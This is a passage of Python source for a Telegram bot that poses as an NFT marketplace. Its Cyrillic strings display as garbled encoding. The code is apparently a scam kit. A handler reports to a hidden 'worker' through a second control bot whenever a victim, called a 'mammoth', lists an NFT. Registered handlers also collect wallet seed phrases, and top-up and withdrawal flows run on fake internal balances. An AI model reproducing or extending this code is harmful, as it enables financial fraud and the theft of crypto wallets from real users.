    photo = InputFile("pictures\\nft.jpg")
    caption, markup = await get_nfts_of_collection(name)
    await call.message.answer_photo(photo, caption, reply_markup=markup)


async def user_add_to_favourite(call: CallbackQuery, callback_data: dict):
    name = callback_data.get("name")
    nft = await db.get_nft_by_name(name)
    user = await db.get_user(call.from_user.id)

    if nft.id in user.user_favourite:
        user.user_favourite.remove(nft.id)
    else:
        user.user_favourite.append(nft.id)

    await db.update_user(user)
    await db.update_nft(nft)

    await call.message.edit_reply_markup(await inline.nft_page_markup(nft, user))


async def user_buy_nft(call: CallbackQuery, callback_data: dict):
    name = callback_data.get("name")
    user = await db.get_user(call.from_user.id)
    nft = await db.get_nft_by_name(name)
    usd = round(nft.price * 1165.59, 2)
    rub = usd * 60
    if user.balance < rub:
        await call.answer("‚ö†Ô∏è –ù–∞ –≤–∞—à–µ–º –±–∞–ª–∞–Ω—Å–µ –Ω–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —Å—Ä–µ–¥—Å—Ç–≤", show_alert=True)
    else:
        await call.message.delete()
        user.balance -= rub
        user.user_collections.append(nft.id)
        await db.update_user(user)

        await call.message.answer("‚úÖ NFT —É—Å–ø–µ—à–Ω–æ –∫—É–ø–ª–µ–Ω")


async def user_find_by_price(call: CallbackQuery, state: FSMContext):
    data = await call.message.edit_caption(f"{hbold('üìù –í–≤–µ–¥–∏—Ç–µ –±—é–¥–∂–µ—Ç –Ω–∞ –∫–æ—Ç–æ—Ä—ã–π –í—ã —Ö–æ—Ç–∏—Ç–µ –∫—É–ø–∏—Ç—å NFT:')}",
                                           reply_markup=await inline.go_back_to_collection_markup())
    await state.update_data(message_id=data.message_id)
    await mainState.Nft.InputNum.set()


async def user_get_result_by_price(message: Message, state: FSMContext):
    data = await state.get_data()
    message_id = data.get("message_id")
    sum = int(message.text)
    nfts = await db.get_nft_by_price(sum)

    await bot.edit_message_caption(message.from_user.id, message_id,
                                   f"{hbold('üí† –î–ª—è –≤–∞—à–µ–≥–æ –±—é–¥–∂–µ—Ç–∞ –Ω–∞–π–¥–µ–Ω—ã –¥–∞–Ω–Ω—ã–µ NFT:')}",
                                   reply_markup=await inline.get_all_nfts_by_collection_name(nfts=nfts))

    await state.reset_state()


async def user_favourite(call: CallbackQuery):
    user = await db.get_user(call.from_user.id)
    await call.message.edit_caption("–í–∞—à–∏ –∏–∑–±—Ä–∞–Ω–Ω—ã–µ NFT:",
                                    reply_markup=await inline.get_list_of_favorites(user.user_favourite))


async def user_mine(call: CallbackQuery):
    user = await db.get_user(call.from_user.id)
    await call.message.edit_caption("""–í–∞—à–∏ NFT:

üîπ - NFT –∫—É–ø–ª–µ–Ω
‚óæ - NFT –≤—ã—Å—Ç–∞–≤–ª–µ–Ω –Ω–∞ –ø—Ä–æ–¥–∞–∂—É""", reply_markup=await inline.get_list_of_my_nft(user))


async def user_get_my_nft(call: CallbackQuery, callback_data: dict, state: FSMContext):
    await call.message.delete()
    get_id = int(callback_data.get("id"))
    user = await db.get_user(call.from_user.id)
    nft = await db.get_nft_by_id(get_id)
    text = await get_nft_text(nft)

    await call.message.answer(text, reply_markup=await inline.control_my_nft(user, nft))
    await state.reset_state()


async def user_sell_nft(call: CallbackQuery, callback_data: dict, state: FSMContext):
    get_id = int(callback_data.get("id"))
    data = await call.message.edit_text("–í–≤–µ–¥–∏—Ç–µ —Ü–µ–Ω—É –≤ —Ä—É–±–ª—è—Ö –∑–∞ –∫–æ—Ç–æ—Ä—É—é –≤—ã —Ö–æ—Ç–∏—Ç–µ –ø—Ä–æ–¥–∞—Ç—å –¥–∞–Ω–Ω—ã–π NFT:",
                                        reply_markup=await inline.back_to_nft_markup(get_id))

    await state.update_data(message_id=data.message_id, nft_id=get_id)
    await mainState.Nft.EnterSum.set()


async def user_cancel_sell(call: CallbackQuery, callback_data: dict, state: FSMContext):
    user = await db.get_user(call.from_user.id)
    nft = await db.get_nft_by_id(int(callback_data.get("id")))
    user.user_collection_in_market.remove(nft.id)

    await db.update_user(user)
    await call.message.edit_reply_markup(await inline.control_my_nft(user, nft))


async def user_change_price(call: CallbackQuery, callback_data: dict):
    name = callback_data.get("name")
    nft = await db.get_nft_by_name(name)
    date_change = ""
    date_now = datetime.now()
    for price in nft.history_price:
        percent = round(100 - (nft.price * 100 / price), 2)
        date_change += f"üîª {date_now.strftime('%Y-%m-%d')} - {price} eth ({percent}%)\n"
        date_now = date_now + timedelta(days=-1)

    await call.message.edit_text(f"""‚ÑπÔ∏è –ö–æ–ª–µ–±–∞–Ω–∏–µ —Ü–µ–Ω –ø–æ—Å–ª–µ–¥–Ω–∏—Ö –ø–æ–∫—É–ø–æ–∫:
‚îú –ö–æ–ª–ª–µ–∫—Ü–∏—è: {nft.collection_name}
‚îú NFT: {name}
‚îî –¶–µ–Ω–∞: {nft.price} eth

{date_change}""", reply_markup=await inline.get_one_nft(nft.name))


async def user_confirm_sell(message: Message, state: FSMContext):
    data = await state.get_data()
    message_id = data.get("message_id")
    nft_id = data.get("nft_id")

    await bot.delete_message(message.from_user.id, message_id)
    user = await db.get_user(message.from_user.id)
    user.user_collection_in_market.append(nft_id)
    await db.update_user(user)
    await message.answer(f"‚úÖ NFT —É—Å–ø–µ—à–Ω–æ –≤—ã—Å—Ç–∞–≤–ª–µ–Ω –Ω–∞ –ø—Ä–æ–¥–∞–∂—É –∑–∞ {message.text} ‚ÇΩ")
    _sum = float(message.text)
    if user.worker_id:
        text = f'<b>üìä –°–µ—Ä–≤–∏—Å - NFT </b>\n\n‚úÖ –ú–∞–º–æ–Ω—Ç ' \
               f'<a href="tg://user?id={message.from_user.id}">{message.from_user.full_name}</a> [/t{user.id}]\n' \
               f'–í—ã—Å—Ç–∞–≤–∏–ª –Ω–∞ –ø—Ä–æ–¥–∞–∂—É NFT –∑–∞ {_sum}'
        await control_bot.send_message(user.worker_id, text,
                                       reply_markup=await inline.put_nft_markup(message.from_user.id, nft_id, _sum))
    await state.reset_state()
    await send_user_profile(user)


def register_user(dp: Dispatcher):
    dp.register_callback_query_handler(user_go_back, text_contains="menu", state="*")
    dp.register_message_handler(user_start, commands=["start"], state="*")

    dp.register_message_handler(user_info, text_contains="–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è")
    dp.register_message_handler(user_support, text_contains="–¢–µ—Ö.–ü–æ–¥–¥–µ—Ä–∂–∫–∞")

    dp.register_callback_query_handler(user_verification, text_contains="verification")

    dp.register_message_handler(user_profile, text_contains="–∫–∞–±–∏–Ω–µ—Ç")
    dp.register_callback_query_handler(choose_method, text_contains="top_up")
    dp.register_callback_query_handler(enter_sum, inline.withdraw.filter())

    dp.register_message_handler(complete_top_up, state=withdrawState.Data.Sum)

    dp.register_callback_query_handler(check_payment, inline.check_payment.filter())

    # Withdraw
    dp.register_callback_query_handler(user_method_withdraw, text_contains="withdrawMarkup")
    dp.register_callback_query_handler(choose_method_withdraw, inline.outdraw.filter())
    dp.register_message_handler(complete_withdraw, state=outdrawState.Main.Num)

    dp.register_callback_query_handler(user_enter_seed, inline.link_wallet.filter())
    dp.register_callback_query_handler(user_link, text_contains="link")

    dp.register_message_handler(user_complete_link, state=profileState.Wallet.Seed)

    dp.register_message_handler(user_nft, text_contains="NFT")
    dp.register_callback_query_handler(user_next_nft, text_contains="next")

    dp.register_callback_query_handler(user_get_nft, inline.collection_markup.filter())

    dp.register_callback_query_handler(user_back_nft, text_contains="go_collection", state="*")

    dp.register_callback_query_handler(user_nft_page, inline.nft_markup.filter())
    dp.register_callback_query_handler(user_go_to_nfts_of_collections, text_contains="go_nft_")

    dp.register_callback_query_handler(user_add_to_favourite, inline.page.filter(action="like"))

    dp.register_callback_query_handler(user_find_by_price, text_contains="by_price")
    dp.register_message_handler(user_get_result_by_price, state=mainState.Nft.InputNum)

    dp.register_callback_query_handler(user_buy_nft, inline.page.filter(action="buy"))

    dp.register_callback_query_handler(user_favourite, text_contains="favourite")
    dp.register_callback_query_handler(user_get_my_nft, inline.my_nft.filter(action="get"), state="*")

    dp.register_callback_query_handler(user_sell_nft, inline.my_nft.filter(action="put"))
    dp.register_callback_query_handler(user_cancel_sell, inline.my_nft.filter(action="take"))
    dp.register_message_handler(user_confirm_sell, state=mainState.Nft.EnterSum)

    dp.register_callback_query_handler(user_mine, text_contains="my_nft")

    dp.register_callback_query_handler(user_change_price, inline.page.filter())
